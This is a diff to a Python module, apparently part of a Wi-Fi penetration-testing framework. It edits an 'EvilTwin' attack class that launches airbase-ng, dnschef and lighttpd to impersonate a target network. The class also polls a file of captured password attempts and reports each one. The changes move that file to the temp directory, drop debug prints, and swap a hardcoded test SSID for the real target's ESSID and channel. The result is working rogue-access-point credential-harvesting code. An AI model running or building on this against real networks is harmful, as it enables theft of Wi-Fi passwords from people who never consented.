@@ -1,9 +1,11 @@
 
 import sys
 import time
+import traceback
 from Model.Attacks.AbstractAttack import AbstractAttack, AttackResultInfo
 import subprocess as sb
 from threading import Thread
+import tempfile
 import Model.utils as utl
 
 class EvilTwin(AbstractAttack):
@@ -13,7 +15,7 @@ class EvilTwin(AbstractAttack):
 
     PROCESS_NAMES = [AIRBASE_MESSAGE, DNSCHEF_MESSAGE, LIGHTTPD_MESSAGE]
 
-    PASSWORDS_FILE = "www/ag.et_attempts.txt"
+    PASSWORDS_FILE = tempfile.gettempdir() + "/et_attempts.txt"
     TIMEOUT = sys.maxsize #infinite
 
     @classmethod
@@ -34,6 +36,7 @@ class EvilTwin(AbstractAttack):
 
     @classmethod
     def execute_attack(cls, q, kwargs) -> bool:
+        utl.delete_file(cls.PASSWORDS_FILE)
         target = kwargs['target']
         interface = kwargs['interface']
 
@@ -61,13 +64,11 @@ class EvilTwin(AbstractAttack):
         try:
             while True:
                 time.sleep(2)
-                with open('www/ag.et_attempts.txt', 'r') as f:
+                with open(cls.PASSWORDS_FILE, 'a+') as f:
                     f.seek(file_position)  # fast forward beyond content read previously
                     for line in f:
-                        print(line)
-                        print(line=='EOF\n')
                         if line == 'EOF\n':
-                            raise Exception
+                            raise Exception('EOF')
                         q.put('Password attempt captured!\n')
                         q.put(line)
 
@@ -82,8 +83,7 @@ class EvilTwin(AbstractAttack):
 
     @classmethod
     def create_AP(cls, q, target, interface):
-        #cmd = ['airbase-ng', '-e', target.essid, '-c', str(target.channel), interface.monitor]
-        cmd = ['airbase-ng', '-e', 'Pentesting-2.4ghz', '-c', '6', 'wlan0mon']
+        cmd = ['airbase-ng', '-e', target.essid, '-c', str(target.channel), interface.monitor]
         p = sb.Popen(["stdbuf","-i0","-o0","-e0"] + cmd, stdout=sb.PIPE, text=True)
 
         with open(utl.pids_file, "a") as f:
@@ -144,5 +144,5 @@ class EvilTwin(AbstractAttack):
         for line in p.stdout:
             q.put((cls.LIGHTTPD_MESSAGE, line))
         
-        with open('www/ag.et_attempts.txt', "a") as f:
+        with open(cls.PASSWORDS_FILE, "a") as f:
             f.write('EOF\n')
